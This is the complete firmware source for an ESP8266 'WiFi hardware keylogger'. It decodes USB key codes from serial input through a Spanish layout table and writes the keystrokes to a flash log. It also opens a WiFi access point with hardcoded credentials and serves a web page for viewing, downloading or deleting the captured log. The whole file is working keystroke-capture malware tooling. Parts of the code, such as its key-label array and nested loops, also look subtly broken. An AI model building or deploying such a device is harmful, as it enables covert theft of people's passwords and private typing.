/*
 *  Basic hardware keylogger WiFi
 *
 *  Explanation: Simple hardware keylogger with wireless connectivity (WiFi) with multiple layout support.
 * 
 *  Copyright (C) 2019 Joel Serna & Ernesto Sanchez
 *
 *  Version:  1.0
 *  Design:   Joel Serna & Ernesto Sanchez
 *  Implementation: Joel Serna & Ernesto Sanchez
 *
 */

#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>
#include "es_es.h"

#define BAUD_RATE 9600
#define SHIFT 0x02
#define ALTGR 0x40

int keys;
int modifiers;
String serial_data;
char serial_char[20];
char *tmp_keys;
char *tmp_modifiers;
int key_modifier;

int value_compare[] = {40, 41, 42, 43, 57, 79, 80, 81, 82, 83};
char keys_compare[] = "\" [ENTER] \", \" [ESC] \", \" [BACKSPACE] \", \"[TAB] \", \" [CAPSLOCK] \", \" [KEY_RIGHT] \", \" [KEY_LEFT] \", \" [KEY_DOWN] \", \" [KEY_UP] \", \" [NUMLOCK] \"";

const String MENU = "<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/viewlog\">View Log</a><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/downloadlog\">Download log</a><p>Keymap layout: </p><form target=\"_blank\"><select name=\"list\"><option value=\"/be\"> BE<option value=\"/cz\"> CZ<option value=\"/da\"> DA<option value=\"/de\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"/fi\"> FI<option value=\"/fr\"> FR<option value=\"/it\"> IT<option value=\"/pt\"> PT<option value=\"/tr\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>";

uint8_t * _keys_global = _keys_es_es;
uint8_t * _modifiers_global = _modifiers_es_es;

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "WiFiKeylogger";
const char *password = "hardwareKeylogger"; //min 8 chars
/* ============= ======================= ============= */

AsyncWebServer server(80);
FSInfo fs_info;
File logs;

void setup() {
  
  Serial.begin(BAUD_RATE);
  
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096);
  SPIFFS.begin();
  
  MDNS.addService("http","tcp",80);

  logs = SPIFFS.open("/logs.txt", "a+");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", MENU);
  });

  server.on("/viewlog", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/logs.txt", "text/html");
    loop(); 
  });

  server.on("/downloadlog", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/logs.txt", String(), true);
  });

  server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
    logs.close();
    logs = SPIFFS.open("/logs.txt", "w");
    request->send(200, "text/plain", "file cleared!"); 
  });  

  server.on("/es", HTTP_GET, [](AsyncWebServerRequest *request){
    // Keymap ES
    _keys_global = _keys_es_es;
    _modifiers_global = _modifiers_es_es;
    request->send(200, "text/plain", "Keymap ES");
  });
  
  server.begin();
}

void loop() {
  
  if(Serial.available()) {
    serial_data = Serial.readStringUntil('\n');
    
    serial_data.toCharArray(serial_char, serial_data.length());

    tmp_keys = strtok(serial_char," ");
    tmp_modifiers = strtok(NULL," ");

    keys = atoi(tmp_keys); // It's a key (example: a = 0x04)
    modifiers = atoi(tmp_modifiers); // It's a modifier (example: shift = 0x02)
    key_modifier = keys + modifiers, HEX; // It's a key + modifier (example: A = 0x04|0x02)

    if(modifiers == 0){ // It's a key
      for (int i = 0; i < 11; i++){
        if(value_compare[i] == keys){
          logs.println(keys_compare[i]);
        } else {
          
          for (i = 0; i < 255; i++){
            if(_keys_global[i] == keys) {
            logs.write(i);
           }
          }
        }
      }
    }
    
    if(modifiers != 0){ // It's a key + modifier
      for (int j = 0; j < 255; j++){
        if(_modifiers_global[j] == key_modifier) {
          logs.write(j);
        }
      }
    }
  }
}
